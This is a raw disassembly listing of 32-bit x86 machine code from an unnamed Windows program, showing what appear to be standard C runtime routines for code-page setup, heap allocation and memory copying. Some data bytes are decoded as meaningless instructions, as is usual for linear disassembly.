  423f23:	push   0x3
  423f25:	call   DWORD PTR ds:0x428028
  423f2b:	int3   
  423f2c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f32:	jne    0x423f35
  423f34:	ret    
  423f35:	jmp    0x423efb
  423f3a:	movzx  eax,BYTE PTR [esp+0x4]
  423f3f:	mov    cl,BYTE PTR [esp+0xc]
  423f43:	test   BYTE PTR [eax+0x45cf21],cl
  423f49:	jne    0x423f67
  423f4b:	cmp    DWORD PTR [esp+0x8],0x0
  423f50:	je     0x423f60
  423f52:	movzx  eax,WORD PTR [eax*2+0x42893a]
  423f5a:	and    eax,DWORD PTR [esp+0x8]
  423f5e:	jmp    0x423f62
  423f60:	xor    eax,eax
  423f62:	test   eax,eax
  423f64:	jne    0x423f67
  423f66:	ret    
  423f67:	xor    eax,eax
  423f69:	inc    eax
  423f6a:	ret    
  423f6b:	push   0x4
  423f6d:	push   0x0
  423f6f:	push   DWORD PTR [esp+0xc]
  423f73:	call   0x423f3a
  423f78:	add    esp,0xc
  423f7b:	ret    
  423f7c:	sub    eax,0x3a4
  423f81:	je     0x423fa5
  423f83:	sub    eax,0x4
  423f86:	je     0x423f9f
  423f88:	sub    eax,0xd
  423f8b:	je     0x423f99
  423f8d:	dec    eax
  423f8e:	je     0x423f93
  423f90:	xor    eax,eax
  423f92:	ret    
  423f93:	mov    eax,0x404
  423f98:	ret    
  423f99:	mov    eax,0x412
  423f9e:	ret    
  423f9f:	mov    eax,0x804
  423fa4:	ret    
  423fa5:	mov    eax,0x411
  423faa:	ret    
  423fab:	push   edi
  423fac:	push   0x40
  423fae:	xor    eax,eax
  423fb0:	pop    ecx
  423fb1:	mov    edi,0x45cf20
  423fb6:	rep stos DWORD PTR es:[edi],eax
  423fb8:	stos   BYTE PTR es:[edi],al
  423fb9:	xor    eax,eax
  423fbb:	mov    ds:0x45d024,eax
  423fc0:	mov    ds:0x45cf1c,eax
  423fc5:	mov    ds:0x45cf14,eax
  423fca:	mov    edi,0x45d030
  423fcf:	stos   DWORD PTR es:[edi],eax
  423fd0:	stos   DWORD PTR es:[edi],eax
  423fd1:	stos   DWORD PTR es:[edi],eax
  423fd2:	pop    edi
  423fd3:	ret    
  423fd4:	push   ebp
  423fd5:	mov    ebp,esp
  423fd7:	sub    esp,0x518
  423fdd:	mov    eax,ds:0x45c430
  423fe2:	xor    eax,DWORD PTR [ebp+0x4]
  423fe5:	push   esi
  423fe6:	mov    DWORD PTR [ebp-0x4],eax
  423fe9:	lea    eax,[ebp-0x18]
  423fec:	push   eax
  423fed:	push   DWORD PTR ds:0x45d024
  423ff3:	call   DWORD PTR ds:0x4280a0
  423ff9:	cmp    eax,0x1
  423ffc:	mov    esi,0x100
  424001:	jne    0x424114
  424007:	xor    eax,eax
  424009:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424010:	inc    eax
  424011:	cmp    eax,esi
  424013:	jb     0x424009
  424015:	mov    al,BYTE PTR [ebp-0x12]
  424018:	test   al,al
  42401a:	mov    BYTE PTR [ebp-0x118],0x20
  424021:	je     0x424059
  424023:	push   ebx
  424024:	lea    edx,[ebp-0x11]
  424027:	push   edi
  424028:	movzx  ecx,BYTE PTR [edx]
  42402b:	movzx  eax,al
  42402e:	cmp    eax,ecx
  424030:	ja     0x42404f
  424032:	sub    ecx,eax
  424034:	inc    ecx
  424035:	mov    ebx,ecx
  424037:	shr    ecx,0x2
  42403a:	lea    edi,[ebp+eax*1-0x118]
  424041:	mov    eax,0x20202020
  424046:	rep stos DWORD PTR es:[edi],eax
  424048:	mov    ecx,ebx
  42404a:	and    ecx,0x3
  42404d:	rep stos BYTE PTR es:[edi],al
  42404f:	inc    edx
  424050:	mov    al,BYTE PTR [edx]
  424052:	inc    edx
  424053:	test   al,al
  424055:	jne    0x424028
  424057:	pop    edi
  424058:	pop    ebx
  424059:	push   0x0
  42405b:	push   DWORD PTR ds:0x45cf14
  424061:	lea    eax,[ebp-0x518]
  424067:	push   DWORD PTR ds:0x45d024
  42406d:	push   eax
  42406e:	push   esi
  42406f:	lea    eax,[ebp-0x118]
  424075:	push   eax
  424076:	push   0x1
  424078:	call   0x425f88
  42407d:	push   0x0
  42407f:	push   DWORD PTR ds:0x45d024
  424085:	lea    eax,[ebp-0x218]
  42408b:	push   esi
  42408c:	push   eax
  42408d:	push   esi
  42408e:	lea    eax,[ebp-0x118]
  424094:	push   eax
  424095:	push   esi
  424096:	push   DWORD PTR ds:0x45cf14
  42409c:	call   0x425bcc
  4240a1:	push   0x0
  4240a3:	push   DWORD PTR ds:0x45d024
  4240a9:	lea    eax,[ebp-0x318]
  4240af:	push   esi
  4240b0:	push   eax
  4240b1:	push   esi
  4240b2:	lea    eax,[ebp-0x118]
  4240b8:	push   eax
  4240b9:	push   0x200
  4240be:	push   DWORD PTR ds:0x45cf14
  4240c4:	call   0x425bcc
  4240c9:	add    esp,0x5c
  4240cc:	xor    eax,eax
  4240ce:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  4240d6:	test   cl,0x1
  4240d9:	je     0x4240f1
  4240db:	or     BYTE PTR [eax+0x45cf21],0x10
  4240e2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  4240e9:	mov    BYTE PTR [eax+0x45d040],cl
  4240ef:	jmp    0x42410d
  4240f1:	test   cl,0x2
  4240f4:	je     0x424106
  4240f6:	or     BYTE PTR [eax+0x45cf21],0x20
  4240fd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424104:	jmp    0x4240e9
  424106:	and    BYTE PTR [eax+0x45d040],0x0
  42410d:	inc    eax
  42410e:	cmp    eax,esi
  424110:	jb     0x4240ce
  424112:	jmp    0x424158
  424114:	xor    eax,eax
  424116:	cmp    eax,0x41
  424119:	jb     0x424134
  42411b:	cmp    eax,0x5a
  42411e:	ja     0x424134
  424120:	or     BYTE PTR [eax+0x45cf21],0x10
  424127:	mov    cl,al
  424129:	add    cl,0x20
  42412c:	mov    BYTE PTR [eax+0x45d040],cl
  424132:	jmp    0x424153
  424134:	cmp    eax,0x61
  424137:	jb     0x42414c
  424139:	cmp    eax,0x7a
  42413c:	ja     0x42414c
  42413e:	or     BYTE PTR [eax+0x45cf21],0x20
  424145:	mov    cl,al
  424147:	sub    cl,0x20
  42414a:	jmp    0x42412c
  42414c:	and    BYTE PTR [eax+0x45d040],0x0
  424153:	inc    eax
  424154:	cmp    eax,esi
  424156:	jb     0x424116
  424158:	mov    ecx,DWORD PTR [ebp-0x4]
  42415b:	xor    ecx,DWORD PTR [ebp+0x4]
  42415e:	pop    esi
  42415f:	call   0x423f2c
  424164:	leave  
  424165:	ret    
  424166:	push   ebp
  424167:	mov    ebp,esp
  424169:	sub    esp,0x1c
  42416c:	mov    eax,ds:0x45c430
  424171:	xor    eax,DWORD PTR [ebp+0x4]
  424174:	push   ebx
  424175:	push   esi
  424176:	mov    esi,DWORD PTR [ebp+0x8]
  424179:	xor    ebx,ebx
  42417b:	cmp    esi,ebx
  42417d:	mov    DWORD PTR [ebp-0x4],eax
  424180:	push   edi
  424181:	je     0x4242db
  424187:	xor    edx,edx
  424189:	xor    eax,eax
  42418b:	cmp    DWORD PTR [eax+0x45c440],esi
  424191:	je     0x4241f8
  424193:	add    eax,0x30
  424196:	inc    edx
  424197:	cmp    eax,0xf0
  42419c:	jb     0x42418b
  42419e:	lea    eax,[ebp-0x1c]
  4241a1:	push   eax
  4241a2:	push   esi
  4241a3:	call   DWORD PTR ds:0x4280a0
  4241a9:	cmp    eax,0x1
  4241ac:	jne    0x4242d3
  4241b2:	push   0x40
  4241b4:	xor    eax,eax
  4241b6:	cmp    DWORD PTR [ebp-0x1c],0x1
  4241ba:	pop    ecx
  4241bb:	mov    edi,0x45cf20
  4241c0:	rep stos DWORD PTR es:[edi],eax
  4241c2:	stos   BYTE PTR es:[edi],al
  4241c3:	mov    DWORD PTR ds:0x45d024,esi
  4241c9:	mov    DWORD PTR ds:0x45cf14,ebx
  4241cf:	jbe    0x4242c1
  4241d5:	cmp    BYTE PTR [ebp-0x16],0x0
  4241d9:	je     0x424299
  4241df:	lea    ecx,[ebp-0x15]
  4241e2:	mov    dl,BYTE PTR [ecx]
  4241e4:	test   dl,dl
  4241e6:	je     0x424299
  4241ec:	movzx  eax,BYTE PTR [ecx-0x1]
  4241f0:	movzx  edx,dl
  4241f3:	jmp    0x424289
  4241f8:	push   0x40
  4241fa:	xor    eax,eax
  4241fc:	pop    ecx
  4241fd:	mov    edi,0x45cf20
  424202:	rep stos DWORD PTR es:[edi],eax
  424204:	lea    ecx,[edx+edx*2]
  424207:	shl    ecx,0x4
  42420a:	mov    DWORD PTR [ebp-0x8],ebx
  42420d:	stos   BYTE PTR es:[edi],al
  42420e:	lea    ebx,[ecx+0x45c450]
  424214:	mov    al,BYTE PTR [ebx]
  424216:	mov    esi,ebx
  424218:	jmp    0x424243
  42421a:	mov    dl,BYTE PTR [esi+0x1]
  42421d:	test   dl,dl
  42421f:	je     0x424247
  424221:	movzx  eax,al
  424224:	movzx  edi,dl
  424227:	cmp    eax,edi
  424229:	ja     0x42423f
  42422b:	mov    edx,DWORD PTR [ebp-0x8]
  42422e:	mov    dl,BYTE PTR [edx+0x45c438]
  424234:	or     BYTE PTR [eax+0x45cf21],dl
  42423a:	inc    eax
  42423b:	cmp    eax,edi
  42423d:	jbe    0x424234
  42423f:	inc    esi
  424240:	inc    esi
  424241:	mov    al,BYTE PTR [esi]
  424243:	test   al,al
  424245:	jne    0x42421a
  424247:	inc    DWORD PTR [ebp-0x8]
  42424a:	add    ebx,0x8
  42424d:	cmp    DWORD PTR [ebp-0x8],0x4
  424251:	jb     0x424214
  424253:	mov    eax,DWORD PTR [ebp+0x8]
  424256:	mov    ds:0x45d024,eax
  42425b:	mov    DWORD PTR ds:0x45cf1c,0x1
  424265:	call   0x423f7c
  42426a:	lea    ecx,[ecx+0x45c444]
  424270:	mov    esi,ecx
  424272:	mov    edi,0x45d030
  424277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424279:	mov    ds:0x45cf14,eax
  42427e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42427f:	jmp    0x4242e0
  424281:	or     BYTE PTR [eax+0x45cf21],0x4
  424288:	inc    eax
  424289:	cmp    eax,edx
  42428b:	jbe    0x424281
  42428d:	inc    ecx
  42428e:	inc    ecx
  42428f:	cmp    BYTE PTR [ecx-0x1],0x0
  424293:	jne    0x4241e2
  424299:	xor    ecx,ecx
  42429b:	inc    ecx
  42429c:	mov    eax,ecx
  42429e:	or     BYTE PTR [eax+0x45cf21],0x8
  4242a5:	inc    eax
  4242a6:	cmp    eax,0xff
  4242ab:	jb     0x42429e
  4242ad:	mov    eax,esi
  4242af:	call   0x423f7c
  4242b4:	mov    ds:0x45cf14,eax
  4242b9:	mov    DWORD PTR ds:0x45cf1c,ecx
  4242bf:	jmp    0x4242c7
  4242c1:	mov    DWORD PTR ds:0x45cf1c,ebx
  4242c7:	xor    eax,eax
  4242c9:	mov    edi,0x45d030
  4242ce:	stos   DWORD PTR es:[edi],eax
  4242cf:	stos   DWORD PTR es:[edi],eax
  4242d0:	stos   DWORD PTR es:[edi],eax
  4242d1:	jmp    0x4242e0
  4242d3:	cmp    DWORD PTR ds:0x45cd84,ebx
  4242d9:	je     0x4242e9
  4242db:	call   0x423fab
  4242e0:	call   0x423fd4
  4242e5:	xor    eax,eax
  4242e7:	jmp    0x4242ec
  4242e9:	or     eax,0xffffffff
  4242ec:	mov    ecx,DWORD PTR [ebp-0x4]
  4242ef:	xor    ecx,DWORD PTR [ebp+0x4]
  4242f2:	pop    edi
  4242f3:	pop    esi
  4242f4:	pop    ebx
  4242f5:	call   0x423f2c
  4242fa:	leave  
  4242fb:	ret    
  4242fc:	push   0x14
  4242fe:	push   0x428550
  424303:	call   0x423858
  424308:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42430c:	push   0xd
  42430e:	call   0x423a1f
  424313:	pop    ecx
  424314:	xor    edi,edi
  424316:	mov    DWORD PTR [ebp-0x4],edi
  424319:	mov    DWORD PTR ds:0x45cd84,edi
  42431f:	mov    eax,DWORD PTR [ebp+0x8]
  424322:	cmp    eax,0xfffffffe
  424325:	jne    0x424339
  424327:	mov    DWORD PTR ds:0x45cd84,0x1
  424331:	call   DWORD PTR ds:0x42809c
  424337:	jmp    0x424364
  424339:	cmp    eax,0xfffffffd
  42433c:	jne    0x424350
  42433e:	mov    DWORD PTR ds:0x45cd84,0x1
  424348:	call   DWORD PTR ds:0x428098
  42434e:	jmp    0x424364
  424350:	cmp    eax,0xfffffffc
  424353:	jne    0x424364
  424355:	mov    DWORD PTR ds:0x45cd84,0x1
  42435f:	mov    eax,ds:0x45cdb4
  424364:	mov    DWORD PTR [ebp+0x8],eax
  424367:	cmp    eax,DWORD PTR ds:0x45d024
  42436d:	je     0x42442e
  424373:	mov    esi,DWORD PTR ds:0x45cf18
  424379:	mov    DWORD PTR [ebp-0x20],esi
  42437c:	cmp    esi,edi
  42437e:	je     0x424384
  424380:	cmp    DWORD PTR [esi],edi
  424382:	je     0x424394
  424384:	push   0x220
  424389:	call   0x424582
  42438e:	pop    ecx
  42438f:	mov    esi,eax
  424391:	mov    DWORD PTR [ebp-0x20],esi
  424394:	cmp    esi,edi
  424396:	je     0x424417
  424398:	push   DWORD PTR [ebp+0x8]
  42439b:	call   0x424166
  4243a0:	pop    ecx
  4243a1:	mov    DWORD PTR [ebp-0x1c],eax
  4243a4:	cmp    eax,edi
  4243a6:	jne    0x424417
  4243a8:	mov    DWORD PTR [esi],edi
  4243aa:	mov    eax,ds:0x45d024
  4243af:	mov    DWORD PTR [esi+0x4],eax
  4243b2:	mov    eax,ds:0x45cf1c
  4243b7:	mov    DWORD PTR [esi+0x8],eax
  4243ba:	mov    eax,ds:0x45cf14
  4243bf:	mov    DWORD PTR [esi+0xc],eax
  4243c2:	xor    eax,eax
  4243c4:	mov    DWORD PTR [ebp-0x24],eax
  4243c7:	cmp    eax,0x5
  4243ca:	jge    0x4243dc
  4243cc:	mov    cx,WORD PTR [eax*2+0x45d030]
  4243d4:	mov    WORD PTR [esi+eax*2+0x10],cx
  4243d9:	inc    eax
  4243da:	jmp    0x4243c4
  4243dc:	xor    eax,eax
  4243de:	mov    DWORD PTR [ebp-0x24],eax
  4243e1:	cmp    eax,0x101
  4243e6:	jge    0x4243f5
  4243e8:	mov    cl,BYTE PTR [eax+0x45cf20]
  4243ee:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  4243f2:	inc    eax
  4243f3:	jmp    0x4243de
  4243f5:	xor    eax,eax
  4243f7:	mov    DWORD PTR [ebp-0x24],eax
  4243fa:	cmp    eax,0x100
  4243ff:	jge    0x424411
  424401:	mov    cl,BYTE PTR [eax+0x45d040]
  424407:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42440e:	inc    eax
  42440f:	jmp    0x4243f7
  424411:	mov    DWORD PTR ds:0x45cf18,esi
  424417:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42441b:	jne    0x424431
  42441d:	cmp    esi,DWORD PTR ds:0x45cf18
  424423:	je     0x424431
  424425:	push   esi
  424426:	call   0x42446a
  42442b:	pop    ecx
  42442c:	jmp    0x424431
  42442e:	mov    DWORD PTR [ebp-0x1c],edi
  424431:	or     DWORD PTR [ebp-0x4],0xffffffff
  424435:	call   0x424443
  42443a:	mov    eax,DWORD PTR [ebp-0x1c]
  42443d:	call   0x423893
  424442:	ret    
  424443:	push   0xd
  424445:	call   0x42398b
  42444a:	pop    ecx
  42444b:	ret    
  42444c:	cmp    DWORD PTR ds:0x45d26c,0x0
  424453:	jne    0x424467
  424455:	push   0xfffffffd
  424457:	call   0x4242fc
  42445c:	pop    ecx
  42445d:	mov    DWORD PTR ds:0x45d26c,0x1
  424467:	xor    eax,eax
  424469:	ret    
  42446a:	push   0xc
  42446c:	push   0x428560
  424471:	call   0x423858
  424476:	mov    esi,DWORD PTR [ebp+0x8]
  424479:	test   esi,esi
  42447b:	je     0x4244d5
  42447d:	cmp    DWORD PTR ds:0x45d144,0x3
  424484:	jne    0x4244c6
  424486:	push   0x4
  424488:	call   0x423a1f
  42448d:	pop    ecx
  42448e:	and    DWORD PTR [ebp-0x4],0x0
  424492:	push   esi
  424493:	call   0x424c42
  424498:	pop    ecx
  424499:	mov    DWORD PTR [ebp-0x1c],eax
  42449c:	test   eax,eax
  42449e:	je     0x4244a9
  4244a0:	push   esi
  4244a1:	push   eax
  4244a2:	call   0x424c6d
  4244a7:	pop    ecx
  4244a8:	pop    ecx
  4244a9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244ad:	call   0x4244bd
  4244b2:	cmp    DWORD PTR [ebp-0x1c],0x0
  4244b6:	jne    0x4244d5
  4244b8:	push   DWORD PTR [ebp+0x8]
  4244bb:	jmp    0x4244c7
  4244bd:	push   0x4
  4244bf:	call   0x42398b
  4244c4:	pop    ecx
  4244c5:	ret    
  4244c6:	push   esi
  4244c7:	push   0x0
  4244c9:	push   DWORD PTR ds:0x45d140
  4244cf:	call   DWORD PTR ds:0x428088
  4244d5:	call   0x423893
  4244da:	ret    
  4244db:	push   0xc
  4244dd:	push   0x428570
  4244e2:	call   0x423858
  4244e7:	mov    esi,DWORD PTR [ebp+0x8]
  4244ea:	cmp    DWORD PTR ds:0x45d144,0x3
  4244f1:	jne    0x424521
  4244f3:	cmp    esi,DWORD PTR ds:0x45cf04
  4244f9:	ja     0x424521
  4244fb:	push   0x4
  4244fd:	call   0x423a1f
  424502:	pop    ecx
  424503:	and    DWORD PTR [ebp-0x4],0x0
  424507:	push   esi
  424508:	call   0x425421
  42450d:	pop    ecx
  42450e:	mov    DWORD PTR [ebp-0x1c],eax
  424511:	or     DWORD PTR [ebp-0x4],0xffffffff
  424515:	call   0x42454d
  42451a:	mov    eax,DWORD PTR [ebp-0x1c]
  42451d:	test   eax,eax
  42451f:	jne    0x424544
  424521:	test   esi,esi
  424523:	jne    0x424526
  424525:	inc    esi
  424526:	cmp    DWORD PTR ds:0x45d144,0x1
  42452d:	je     0x424535
  42452f:	add    esi,0xf
  424532:	and    esi,0xfffffff0
  424535:	push   esi
  424536:	push   0x0
  424538:	push   DWORD PTR ds:0x45d140
  42453e:	call   DWORD PTR ds:0x4280a4
  424544:	call   0x423893
  424549:	ret    
  42454a:	mov    esi,DWORD PTR [ebp+0x8]
  42454d:	push   0x4
  42454f:	call   0x42398b
  424554:	pop    ecx
  424555:	ret    
  424556:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42455b:	ja     0x42457f
  42455d:	push   DWORD PTR [esp+0x4]
  424561:	call   0x4244db
  424566:	test   eax,eax
  424568:	pop    ecx
  424569:	jne    0x424581
  42456b:	cmp    DWORD PTR [esp+0x8],eax
  42456f:	je     0x424581
  424571:	push   DWORD PTR [esp+0x4]
  424575:	call   0x426142
  42457a:	test   eax,eax
  42457c:	pop    ecx
  42457d:	jne    0x42455d
  42457f:	xor    eax,eax
  424581:	ret    
  424582:	push   DWORD PTR ds:0x45cdc8
  424588:	push   DWORD PTR [esp+0x8]
  42458c:	call   0x424556
  424591:	pop    ecx
  424592:	pop    ecx
  424593:	ret    
  424594:	int3   
  424595:	int3   
  424596:	int3   
  424597:	int3   
  424598:	int3   
  424599:	int3   
  42459a:	int3   
  42459b:	int3   
  42459c:	int3   
  42459d:	int3   
  42459e:	int3   
  42459f:	int3   
  4245a0:	push   ebp
  4245a1:	mov    ebp,esp
  4245a3:	push   edi
  4245a4:	push   esi
  4245a5:	mov    esi,DWORD PTR [ebp+0xc]
  4245a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245ab:	mov    edi,DWORD PTR [ebp+0x8]
  4245ae:	mov    eax,ecx
  4245b0:	mov    edx,ecx
  4245b2:	add    eax,esi
  4245b4:	cmp    edi,esi
  4245b6:	jbe    0x4245c0
  4245b8:	cmp    edi,eax
  4245ba:	jb     0x42473c
  4245c0:	test   edi,0x3
  4245c6:	jne    0x4245dc
  4245c8:	shr    ecx,0x2
  4245cb:	and    edx,0x3
  4245ce:	cmp    ecx,0x8
  4245d1:	jb     0x4245fc
  4245d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245d5:	jmp    DWORD PTR [edx*4+0x4246ec]
  4245dc:	mov    eax,edi
  4245de:	mov    edx,0x3
  4245e3:	sub    ecx,0x4
  4245e6:	jb     0x4245f4
  4245e8:	and    eax,0x3
  4245eb:	add    ecx,eax
  4245ed:	jmp    DWORD PTR [eax*4+0x424600]
  4245f4:	jmp    DWORD PTR [ecx*4+0x4246fc]
  4245fb:	nop
  4245fc:	jmp    DWORD PTR [ecx*4+0x424680]
  424603:	nop
  424604:	adc    BYTE PTR [esi+0x42],al
  424607:	add    BYTE PTR [esi+eax*2],bh
  42460a:	inc    edx
  42460b:	add    BYTE PTR [eax+0x46],ah
  42460e:	inc    edx
  42460f:	add    BYTE PTR [ebx],ah
  424611:	ror    DWORD PTR [edx-0x75f877fa],1
  424617:	inc    esi
  424618:	add    DWORD PTR [eax+0x468a0147],ecx
  42461e:	add    al,cl
  424620:	jmp    0x289ce27
  424625:	add    esi,0x3
  424628:	add    edi,0x3
  42462b:	cmp    ecx,0x8
  42462e:	jb     0x4245fc
  424630:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424632:	jmp    DWORD PTR [edx*4+0x4246ec]
  424639:	lea    ecx,[ecx+0x0]
  42463c:	and    edx,ecx
  42463e:	mov    al,BYTE PTR [esi]
  424640:	mov    BYTE PTR [edi],al
  424642:	mov    al,BYTE PTR [esi+0x1]
  424645:	shr    ecx,0x2
  424648:	mov    BYTE PTR [edi+0x1],al
  42464b:	add    esi,0x2
  42464e:	add    edi,0x2
  424651:	cmp    ecx,0x8
  424654:	jb     0x4245fc
  424656:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424658:	jmp    DWORD PTR [edx*4+0x4246ec]
  42465f:	nop
  424660:	and    edx,ecx
  424662:	mov    al,BYTE PTR [esi]
  424664:	mov    BYTE PTR [edi],al
  424666:	add    esi,0x1
  424669:	shr    ecx,0x2
  42466c:	add    edi,0x1
  42466f:	cmp    ecx,0x8
  424672:	jb     0x4245fc
  424674:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424676:	jmp    DWORD PTR [edx*4+0x4246ec]
  42467d:	lea    ecx,[ecx+0x0]
  424680:	jecxz  0x4246c8
  424682:	inc    edx
  424683:	add    al,dl
  424685:	inc    esi
  424686:	inc    edx
  424687:	add    al,cl
  424689:	inc    esi
  42468a:	inc    edx
  42468b:	add    al,al
  42468d:	inc    esi
  42468e:	inc    edx
  42468f:	add    BYTE PTR [eax-0x4fffbdba],bh
  424695:	inc    esi
  424696:	inc    edx
  424697:	add    BYTE PTR [eax-0x5fffbdba],ch
  42469d:	inc    esi
  42469e:	inc    edx
  42469f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246a5:	inc    esp
  4246a6:	(bad)  
  4246a7:	in     al,0x8b
  4246a9:	inc    esp
  4246aa:	mov    gs,eax
  4246ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4246b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4246b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4246b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4246bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4246c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4246c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4246c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4246cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4246d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4246d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4246d8:	lea    eax,[ecx*4+0x0]
  4246df:	add    esi,eax
  4246e1:	add    edi,eax
  4246e3:	jmp    DWORD PTR [edx*4+0x4246ec]
  4246ea:	mov    edi,edi
  4246ec:	cld    
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [edi+eax*2],al
  4246f2:	inc    edx
  4246f3:	add    BYTE PTR [eax],dl
  4246f5:	inc    edi
  4246f6:	inc    edx
  4246f7:	add    BYTE PTR [edi+eax*2],ah
  4246fa:	inc    edx
  4246fb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424701:	leave  
  424702:	ret    
  424703:	nop
  424704:	mov    al,BYTE PTR [esi]
  424706:	mov    BYTE PTR [edi],al
  424708:	mov    eax,DWORD PTR [ebp+0x8]
  42470b:	pop    esi
  42470c:	pop    edi
  42470d:	leave  
  42470e:	ret    
  42470f:	nop
  424710:	mov    al,BYTE PTR [esi]
  424712:	mov    BYTE PTR [edi],al
  424714:	mov    al,BYTE PTR [esi+0x1]
  424717:	mov    BYTE PTR [edi+0x1],al
  42471a:	mov    eax,DWORD PTR [ebp+0x8]
  42471d:	pop    esi
  42471e:	pop    edi
  42471f:	leave  
  424720:	ret    
  424721:	lea    ecx,[ecx+0x0]
  424724:	mov    al,BYTE PTR [esi]
  424726:	mov    BYTE PTR [edi],al
  424728:	mov    al,BYTE PTR [esi+0x1]
  42472b:	mov    BYTE PTR [edi+0x1],al
  42472e:	mov    al,BYTE PTR [esi+0x2]
  424731:	mov    BYTE PTR [edi+0x2],al
  424734:	mov    eax,DWORD PTR [ebp+0x8]
  424737:	pop    esi
  424738:	pop    edi
  424739:	leave  
  42473a:	ret    
  42473b:	nop
  42473c:	lea    esi,[ecx+esi*1-0x4]
  424740:	lea    edi,[ecx+edi*1-0x4]
  424744:	test   edi,0x3
  42474a:	jne    0x424770
  42474c:	shr    ecx,0x2
  42474f:	and    edx,0x3
  424752:	cmp    ecx,0x8
  424755:	jb     0x424764
  424757:	std    
  424758:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42475a:	cld    
  42475b:	jmp    DWORD PTR [edx*4+0x424888]
  424762:	mov    edi,edi
  424764:	neg    ecx
  424766:	jmp    DWORD PTR [ecx*4+0x424838]
  42476d:	lea    ecx,[ecx+0x0]
  424770:	mov    eax,edi
  424772:	mov    edx,0x3
  424777:	cmp    ecx,0x4
  42477a:	jb     0x424788
  42477c:	and    eax,0x3
  42477f:	sub    ecx,eax
  424781:	jmp    DWORD PTR [eax*4+0x42478c]
  424788:	jmp    DWORD PTR [ecx*4+0x424888]
  42478f:	nop
  424790:	pushf  
  424791:	inc    edi
  424792:	inc    edx
  424793:	add    al,al
  424795:	inc    edi
  424796:	inc    edx
  424797:	add    al,ch
  424799:	inc    edi
  42479a:	inc    edx
  42479b:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247a1:	mov    BYTE PTR [edi+0x3],al
  4247a4:	sub    esi,0x1
  4247a7:	shr    ecx,0x2
  4247aa:	sub    edi,0x1
  4247ad:	cmp    ecx,0x8
  4247b0:	jb     0x424764
  4247b2:	std    
  4247b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247b5:	cld    
  4247b6:	jmp    DWORD PTR [edx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    al,BYTE PTR [esi+0x3]
  4247c3:	and    edx,ecx
  4247c5:	mov    BYTE PTR [edi+0x3],al
  4247c8:	mov    al,BYTE PTR [esi+0x2]
  4247cb:	shr    ecx,0x2
  4247ce:	mov    BYTE PTR [edi+0x2],al
  4247d1:	sub    esi,0x2
  4247d4:	sub    edi,0x2
  4247d7:	cmp    ecx,0x8
  4247da:	jb     0x424764
  4247dc:	std    
  4247dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247df:	cld    
  4247e0:	jmp    DWORD PTR [edx*4+0x424888]
  4247e7:	nop
  4247e8:	mov    al,BYTE PTR [esi+0x3]
  4247eb:	and    edx,ecx
  4247ed:	mov    BYTE PTR [edi+0x3],al
  4247f0:	mov    al,BYTE PTR [esi+0x2]
  4247f3:	mov    BYTE PTR [edi+0x2],al
  4247f6:	mov    al,BYTE PTR [esi+0x1]
  4247f9:	shr    ecx,0x2
  4247fc:	mov    BYTE PTR [edi+0x1],al
  4247ff:	sub    esi,0x3
  424802:	sub    edi,0x3
  424805:	cmp    ecx,0x8
  424808:	jb     0x424764
  42480e:	std    
  42480f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424811:	cld    
  424812:	jmp    DWORD PTR [edx*4+0x424888]
  424819:	lea    ecx,[ecx+0x0]
  42481c:	cmp    al,0x48
  42481e:	inc    edx
  42481f:	add    BYTE PTR [eax+ecx*2+0x42],al
  424823:	add    BYTE PTR [eax+ecx*2+0x42],cl
  424827:	add    BYTE PTR [eax+ecx*2+0x42],dl
  42482b:	add    BYTE PTR [eax+ecx*2+0x42],bl
  42482f:	add    BYTE PTR [eax+ecx*2+0x42],ah
  424833:	add    BYTE PTR [eax+ecx*2+0x42],ch
  424837:	add    BYTE PTR [edi+0x48],bh
  42483a:	inc    edx
  42483b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424841:	inc    esp
  424842:	(bad)  
  424843:	sbb    al,0x8b
  424845:	inc    esp
  424846:	mov    ds,WORD PTR [eax]
  424848:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42484c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  424850:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  424854:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  424858:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42485c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
